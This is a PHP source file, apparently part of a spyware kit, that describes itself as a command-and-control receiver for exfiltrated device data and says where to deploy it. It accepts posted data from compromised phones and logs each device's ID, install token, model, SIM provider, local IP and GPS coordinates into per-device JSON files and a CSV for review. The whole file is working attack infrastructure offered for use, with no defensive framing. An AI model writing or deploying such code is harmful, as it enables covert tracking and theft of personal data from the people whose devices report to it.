<?php
// C2 Receiver Endpoint - receives exfiltrated device data
// Deploy this to your server (e.g., onrender.com, VPS, etc.)

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Request-ID');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    exit;
}

$rawInput = file_get_contents('php://input');
$payload = json_decode($rawInput, true);

if (!$payload || !isset($payload['segment'])) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Invalid payload']);
    exit;
}

$deviceId = $payload['device_id'] ?? $payload['install_token'] ?? 'unknown';
$segment = (int)$payload['segment'];
$timestamp = date('Y-m-d_H-i-s');
$safeId = preg_replace('/[^a-zA-Z0-9_-]/', '_', $deviceId);

// Ensure storage directory exists
$storageDir = __DIR__ . '/data/' . $safeId;
if (!is_dir($storageDir)) {
    mkdir($storageDir, 0755, true);
}

// Write segment data to daily log file
$dailyFile = $storageDir . '/session_' . $timestamp . '.json';
$existing = [];
if (file_exists($dailyFile)) {
    $existing = json_decode(file_get_contents($dailyFile), true) ?: [];
}

$existing['device_id'] = $deviceId;
$existing['install_token'] = $payload['install_token'] ?? '';
$existing['device_model'] = $payload['device_model'] ?? '';
$existing['device_brand'] = $payload['device_brand'] ?? '';
$existing['os_version'] = $payload['os_version'] ?? '';
$existing['sim_provider'] = $payload['sim_provider'] ?? '';
$existing['local_ip'] = $payload['local_ip'] ?? '';
$existing['lat'] = $payload['lat'] ?? null;
$existing['lng'] = $payload['lng'] ?? null;
$existing['seq'] = $payload['seq'] ?? 0;
$existing['last_segment'] = $segment;
$existing['last_seen'] = time();
$existing['segments'][$segment] = [
    'received_at' => date('c'),
    'data' => $payload
];

file_put_contents($dailyFile, json_encode($existing, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// Also append to a master CSV for quick review
$csvFile = $storageDir . '/log.csv';
$isNew = !file_exists($csvFile);
$fp = fopen($csvFile, 'a');
if ($isNew) {
    fputcsv($fp, ['timestamp', 'device_id', 'model', 'brand', 'os', 'sim', 'ip', 'lat', 'lng', 'segment', 'seq']);
}
fputcsv($fp, [
    date('c'),
    $deviceId,
    $payload['device_model'] ?? '',
    $payload['device_brand'] ?? '',
    $payload['os_version'] ?? '',
    $payload['sim_provider'] ?? '',
    $payload['local_ip'] ?? '',
    $payload['lat'] ?? '',
    $payload['lng'] ?? '',
    $segment,
    $payload['seq'] ?? 0
]);
fclose($fp);

http_response_code(200);
echo json_encode(['status' => 'ok', 'segment' => $segment, 'seq' => $payload['seq'] ?? 0]);
